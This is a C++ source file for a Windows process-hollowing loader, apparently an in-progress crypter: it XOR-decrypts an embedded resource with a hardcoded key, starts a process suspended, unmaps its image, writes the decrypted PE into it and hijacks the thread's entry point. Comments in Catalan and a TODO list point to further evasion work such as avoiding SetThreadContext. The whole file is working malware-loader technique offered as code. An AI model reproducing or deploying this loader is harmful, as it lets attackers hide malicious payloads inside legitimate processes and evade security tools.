#include <iostream>
#include "WinInternals.h"
#include <excpt.h>
#include <winnt.h>
#include <memoryapi.h>
#include "resource.h"

#include <wincrypt.h>
#pragma comment (lib, "advapi32")

//#define KEYLENGTH  0x00800000
//#define ENCRYPT_ALGORITHM CALG_RC4

using namespace std;

class ProcessHollower {
    public:
        ProcessHollower() {
            dwGuestPEAddress = 0;
            lpProcessInformation = new PROCESS_INFORMATION();
            ImageBaseAddress = 0;
            pLoadedGuestPE = new LOADED_IMAGE;
        }

        BOOL execute(char *lpApplicationName, LPVOID lpBuffer) {
            GetGuestPEData(lpBuffer);
            CreateSuspendedProcess(lpApplicationName);
            GetProcessData();
            UnmapProcessMemory();
            AllocateProcessMemory();
            InjectGuestPE();
//            Sleep(60000);
            JumpToEntryPoint();
            return TRUE;
        }

    private:
        DWORD dwGuestPEAddress;
        LPPROCESS_INFORMATION lpProcessInformation;
        DWORD ImageBaseAddress;
        PLOADED_IMAGE pLoadedGuestPE;

        BOOL GetGuestPEData(LPVOID lpBuffer) {
            dwGuestPEAddress = (DWORD) lpBuffer;
            pLoadedGuestPE = GetLoadedImage((DWORD) lpBuffer);
            return TRUE;
        }

        BOOL CreateSuspendedProcess(char *lpApplicationName) {
            auto lpStartupInfo = new STARTUPINFOA();;
            CreateProcess(lpApplicationName, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, lpStartupInfo, lpProcessInformation);
            return TRUE;
        }

        BOOL GetProcessData() {
            PPEB pPEB = ReadRemotePEB(lpProcessInformation->hProcess);
            ImageBaseAddress = (DWORD)pPEB->ImageBaseAddress; // atencio! si no hi ha relocations caldra que agafem l'address del PE guest i sobreescrivim l'image base address del PEB!
            return TRUE;
        }

        BOOL UnmapProcessMemory() {
            HMODULE hNTDLL = GetModuleHandleA("ntdll");
            FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
            auto NtUnmapViewOfSection = (_NtUnmapViewOfSection) fpNtUnmapViewOfSection;
            DWORD result = NtUnmapViewOfSection(lpProcessInformation->hProcess, (PVOID)ImageBaseAddress);
            if (result) {
                return FALSE;
            }
            return TRUE;
        }

        BOOL AllocateProcessMemory() {
            LPVOID lpBaseAddress = VirtualAllocEx(lpProcessInformation->hProcess, (PVOID)ImageBaseAddress, pLoadedGuestPE->FileHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//            LPVOID lpBaseAddress = VirtualAllocEx(lpProcessInformation->hProcess, (PVOID)ImageBaseAddress, pLoadedGuestPE->FileHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            return lpBaseAddress != nullptr;
        }

        BOOL InjectGuestPE() {
            DWORD dwRelocationDelta = ImageBaseAddress - pLoadedGuestPE->FileHeader->OptionalHeader.ImageBase;
            pLoadedGuestPE->FileHeader->OptionalHeader.ImageBase = (DWORD)ImageBaseAddress;
            WriteProcessSection(ImageBaseAddress, (LPCVOID) dwGuestPEAddress, pLoadedGuestPE->FileHeader->OptionalHeader.SizeOfHeaders);

            for (DWORD i = 0; i < pLoadedGuestPE->NumberOfSections; i++) {
//                if (i == 2) {
//                    Sleep(60000);
//                }
                if (!pLoadedGuestPE->Sections[i].PointerToRawData)
                    continue;
                DWORD pSectionDestination = ImageBaseAddress + pLoadedGuestPE->Sections[i].VirtualAddress;
                WriteProcessSection(pSectionDestination, (LPCVOID)(dwGuestPEAddress + pLoadedGuestPE->Sections[i].PointerToRawData), pLoadedGuestPE->Sections[i].SizeOfRawData);
            }
            ApplyRelocations(dwRelocationDelta);
//            ProcessIAT();
            SetSectionsPermissions();
            return TRUE;
        }

        BOOL WriteProcessSection(DWORD lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize) {
            SIZE_T lpNumberOfBytesWritten;
            BOOL bSuccess = WriteProcessMemory(lpProcessInformation->hProcess, (PVOID)lpBaseAddress, lpBuffer, nSize, &lpNumberOfBytesWritten);
            return bSuccess && nSize == lpNumberOfBytesWritten;
        }

        VOID ApplyRelocations(DWORD dwRelocationDelta) {
            if (dwRelocationDelta != 0) {
                return;
            }
            DWORD dwOffset = 0;
            IMAGE_DATA_DIRECTORY RelocationData = pLoadedGuestPE->FileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            int dwRelocationSection = pLoadedGuestPE->NumberOfSections-1; // aixo s'ha de fer dinamic (.reloc pot no ser l'ultima seccio)
            DWORD dwRelocationAddress = pLoadedGuestPE->Sections[dwRelocationSection].PointerToRawData;
            while (dwOffset < RelocationData.Size) {
                auto pBlockheader = (PBASE_RELOCATION_BLOCK) (dwGuestPEAddress + dwRelocationAddress + dwOffset);
                dwOffset += sizeof(BASE_RELOCATION_BLOCK);
                auto pBlocks = (PBASE_RELOCATION_ENTRY) (dwGuestPEAddress + dwRelocationAddress + dwOffset);
                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
                ApplyBlockRelocations(dwEntryCount, &dwOffset, pBlocks, pBlockheader, dwRelocationDelta);
            }
        }

        VOID ApplyBlockRelocations(DWORD dwEntryCount, DWORD *dwOffset, PBASE_RELOCATION_ENTRY pBlocks, PBASE_RELOCATION_BLOCK pBlockHeader, DWORD dwRelocationDelta) {
            for (DWORD entry = 0; entry < dwEntryCount; entry++) {
                if (pBlocks[entry].Type == 0) {
                    *dwOffset += sizeof(BASE_RELOCATION_ENTRY);
                    continue;
                }
                DWORD dwFieldAddress = pBlockHeader->PageAddress + pBlocks[entry].Offset;

                DWORD dwBuffer = 0;
                ReadProcessMemory(lpProcessInformation->hProcess, (PVOID) (ImageBaseAddress + dwFieldAddress), &dwBuffer, sizeof(DWORD), nullptr);
                dwBuffer += dwRelocationDelta;
                BOOL bSuccess = WriteProcessMemory(lpProcessInformation->hProcess, (PVOID) (ImageBaseAddress + dwFieldAddress), &dwBuffer, sizeof(DWORD), nullptr);
                *dwOffset += sizeof(BASE_RELOCATION_ENTRY);
            }
        }

        BOOL SetSectionsPermissions() {
            DWORD dwFlOldProtect;
            DWORD MemProtectionFlag;
            BOOL bSuccess = VirtualProtectEx(lpProcessInformation->hProcess, (LPVOID) ImageBaseAddress,  pLoadedGuestPE->FileHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwFlOldProtect);
            for (DWORD i = 0; i < pLoadedGuestPE->NumberOfSections; i++) {
                if (!pLoadedGuestPE->Sections[i].PointerToRawData)
                    continue;
                MemProtectionFlag = GetMemProtectionFlag(pLoadedGuestPE->Sections[i].Characteristics);
                bSuccess = VirtualProtectEx(lpProcessInformation->hProcess, (LPVOID) (ImageBaseAddress + pLoadedGuestPE->Sections[i].VirtualAddress),  pLoadedGuestPE->Sections[i].SizeOfRawData, MemProtectionFlag, &dwFlOldProtect);
                DWORD test = 0;
            }
            return bSuccess;
        }

        // potser es pot millorar. potser no cal que vagi aqui
        static DWORD GetMemProtectionFlag(DWORD Characteristic) {
            DWORD MemProtectionFlag;
            if (Characteristic & IMAGE_SCN_MEM_EXECUTE) {
                if (Characteristic & IMAGE_SCN_MEM_READ) {
                   if (Characteristic & IMAGE_SCN_MEM_WRITE) {
                       MemProtectionFlag = PAGE_EXECUTE_READWRITE;
                   } else {
                       MemProtectionFlag = PAGE_EXECUTE_READ;
                   }
                } else {
                    MemProtectionFlag = PAGE_EXECUTE;
                }
            } else {
                if (Characteristic & IMAGE_SCN_MEM_WRITE) {
                    MemProtectionFlag = PAGE_READWRITE;
                } else {
                    MemProtectionFlag = PAGE_READONLY;
                }
            }
            return MemProtectionFlag;
        }

        // NO ES NECESSARI ja que el loader se n'encarrega. l'unic es que si no mantenim l'image base address del proces original (pq no hi ha relocations, per exemple) caldra que sobreescrivim l'image base address del PEB
//        BOOL ProcessIAT() {
//            IMAGE_DATA_DIRECTORY DataDirectory = pLoadedGuestPE->FileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
//            if (!DataDirectory.Size) {
//                return TRUE;
//            }
//            auto dwBuffer = new IMAGE_IMPORT_DESCRIPTOR();
//            ReadProcessMemory(lpProcessInformation->hProcess, (PVOID) (ImageBaseAddress + DataDirectory.VirtualAddress), dwBuffer, sizeof(PIMAGE_IMPORT_DESCRIPTOR), nullptr);
//            auto pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) dwBuffer;
//            PIMAGE_THUNK_DATA pThunkDataOrig;
//            while (pImportDescriptor->Name != 0) {
//                auto lpLibName = (LPSTR) (ImageBaseAddress + pImportDescriptor->Name);
//                HMODULE hLibModule = LoadLibraryA(lpLibName);
////                if (pImportDescriptor->ForwarderChain != -1) { // TODO: WHAT IS THAT?
//                    //DMSG("FIXME: Cannot handle Import Forwarding");
//                    //flError = 1;
//                    //break;
////                }
//                auto pThunkData = (PIMAGE_THUNK_DATA)(ImageBaseAddress + pImportDescriptor->FirstThunk);
//                if (pImportDescriptor->Characteristics == 0) {
//                    /* Borland compilers doesn't produce Hint Table */
//                    pThunkDataOrig = pThunkData;
//                } else {
//                    /* Hint Table */
//                    pThunkDataOrig = (PIMAGE_THUNK_DATA) (ImageBaseAddress + pImportDescriptor->Characteristics);
//                }
//                while (pThunkDataOrig->u1.AddressOfData != 0) {
//                    if (pThunkDataOrig->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
//                        pThunkData->u1.Function = (DWORD) GetProcAddress(hLibModule, MAKEINTRESOURCEA(pThunkData->u1.AddressOfData));
//                    } else {
//                        auto pImportByName = (PIMAGE_IMPORT_BY_NAME) (ImageBaseAddress + pThunkDataOrig->u1.AddressOfData);
//                        pThunkData->u1.Function = (DWORD) GetProcAddress(hLibModule, (LPCSTR) pImportByName->Name);
//                    }
//                    pThunkDataOrig++;
//                    pThunkData++;
//                }
//                FreeLibrary(hLibModule);
//            }
//            return TRUE;
//        }

        BOOL JumpToEntryPoint() {
            auto pContext = new CONTEXT();
            pContext->ContextFlags = CONTEXT_INTEGER;
            GetThreadContext(lpProcessInformation->hThread, pContext);
            DWORD dwEntrypoint = ImageBaseAddress + pLoadedGuestPE->FileHeader->OptionalHeader.AddressOfEntryPoint;
            pContext->Eax = dwEntrypoint;

            BOOL result = SetThreadContext(lpProcessInformation->hThread, pContext);

            if (!ResumeThread(lpProcessInformation->hThread)) {
                return FALSE;
            }
            return TRUE;
        }

    //ProcessIAT?
};

// aixo no anira aqui
BOOL ReadPEFile(char *resource, char *lpBuffer) {
    HANDLE hFile;
    DWORD nNumberOfBytesToRead = 100000;
    DWORD nNumberOfBytesRead = 0;
    LPOVERLAPPED lpOverlapped = nullptr;

    hFile = CreateFileA(resource, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    BOOL success = ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, &nNumberOfBytesRead, lpOverlapped);
    return success;
}

//BOOL Decrypt() {
//    bool fReturn = false;
//    HANDLE hSourceFile = INVALID_HANDLE_VALUE;
//    HANDLE hDestinationFile = INVALID_HANDLE_VALUE;
//    HCRYPTKEY hKey = NULL;
//    HCRYPTHASH hHash = NULL;
//
//    HCRYPTPROV hCryptProv = NULL;
//
//    DWORD dwCount;
//    PBYTE pbBuffer = NULL;
//    DWORD dwBlockLen;
//    DWORD dwBufferLen;
//
//    //---------------------------------------------------------------
//    // Get the handle to the default provider.
//    CryptAcquireContext(&hCryptProv, nullptr, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0);
//
//    //-----------------------------------------------------------
//    // Decrypt the file with a session key derived from a
//    // password.
//
//    //-----------------------------------------------------------
//    // Create a hash object.
//    CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash);
//
//    //-----------------------------------------------------------
//    // Hash in the password data.
//    char pszPassword[] = "This is a secret password";
//    CryptHashData(hHash, (BYTE *)pszPassword, lstrlen(pszPassword),0);
//
//    //-----------------------------------------------------------
//    // Derive a session key from the hash object.
//
//    CryptDeriveKey(hCryptProv, ENCRYPT_ALGORITHM, hHash, KEYLENGTH, &hKey);
//    BCRYPT_ALG_HANDLE hAlgorithm;
//    BCRYPT_KEY_HANDLE hImportKey;
//    LPCWSTR           pszBlobType;
//    BCRYPT_KEY_HANDLE *phKey;
//    PUCHAR            pbKeyObject;
//    ULONG             cbKeyObject;
//    PUCHAR            pbInput;
//    ULONG             cbInput;
//    ULONG             dwFlags;
//    BCryptImportKey(
//            hAlgorithm,
//            hImportKey,
//            pszBlobType,
//            phKey,
//            pbKeyObject,
//            cbKeyObject,
//            pbInput,
//            cbInput,
//            dwFlags
//    );
//
//    CryptDecrypt(hKey, 0, fEOF, 0, pbBuffer, &dwCount);
//}

int main() {
    HRSRC myResource = FindResource(nullptr, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    unsigned int myResourceSize = SizeofResource(nullptr, myResource);
    HGLOBAL myResourceData = LoadResource(nullptr, myResource);
    void* pMyBinaryData = LockResource(myResourceData);
    char* lpBuffer = new char[myResourceSize];
    memcpy(lpBuffer, pMyBinaryData, myResourceSize);

    char key[] = "this is some supersecret password";
    int keyLength = strlen(key);

    for (int i = 0; i < myResourceSize; i++) {
        lpBuffer[i] ^= key[i % keyLength];
    }

    ProcessHollower PHollower;
    //char injectedName[] = "C:\\Users\\uri\\Desktop\\HelloWorld.exe";
//    char injectedName[] = "C:\\Windows\\System32\\calc.exe";
    //char lpBuffer[BUFFER_SIZE]; //buffer size needs to be better defined
    //ReadPEFile(injectedName, lpBuffer);
    char appName[] = "C:\\Users\\uri\\Desktop\\stubborn\\cmake-build-debug\\stubborn.exe";
    PHollower.execute(appName, lpBuffer);
    return 0;
}

/** TODO:
 * - Clean code
 * + Load resource
 * - Process IAT
 * + Memory permissions (not everything RWX)
 * - 64 bits
 * - Other methods: avoid SetThreadContext, etc.
 */